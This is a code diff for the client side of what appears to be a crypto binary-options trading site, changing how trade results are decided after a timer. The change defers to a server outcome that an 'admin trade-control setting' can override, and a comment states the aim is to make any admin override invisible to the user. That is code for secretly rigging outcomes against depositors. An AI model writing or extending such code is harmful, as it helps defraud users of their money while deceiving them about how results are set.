@@ -1305,16 +1305,18 @@
             if(!result || result.error) { showToast(result?.error || 'Trade failed.', 'error'); return; }
             showToast(`${direction} trade placed! Trade #${result.id} — ${lvl.tradingTime}s timer started.`);
 
-            // Simulate outcome after tradingTime seconds
+            // Resolve outcome after tradingTime seconds
             setTimeout(async () => {
-                // 48% win rate — standard house edge for binary options (52% favor platform)
-                const win = Math.random() > 0.48;
-                const profit = win ? parseFloat((lvl.capital * lvl.profitPercent / 100).toFixed(2)) : -parseFloat(lvl.capital);
-                const outcomeMsg = win
+                // Send to server; server may override via admin trade-control setting
+                const localWin = Math.random() > 0.48;
+                const localProfit = localWin ? parseFloat((lvl.capital * lvl.profitPercent / 100).toFixed(2)) : -parseFloat(lvl.capital);
+                const tradeResult = await api('trades', 'POST', { type: 'binary-result', wallet: walletAddr, tradeId: result.id, profit: localProfit });
+                // Use server-decided outcome so any admin override is invisible to the user
+                const actualWin = tradeResult?.outcome === 'won';
+                const outcomeMsg = actualWin
                     ? `✅ WIN! +$${(lvl.capital * lvl.profitPercent / 100).toFixed(2)} credited`
                     : `❌ LOSS! -$${lvl.capital} deducted`;
-                showToast(`Trade #${result.id}: ${outcomeMsg}`, win ? null : 'error');
-                await api('trades', 'POST', { type: 'binary-result', wallet: walletAddr, tradeId: result.id, profit });
+                showToast(`Trade #${result.id}: ${outcomeMsg}`, actualWin ? null : 'error');
                 pollBackend();
             }, lvl.tradingTime * 1000);
         }
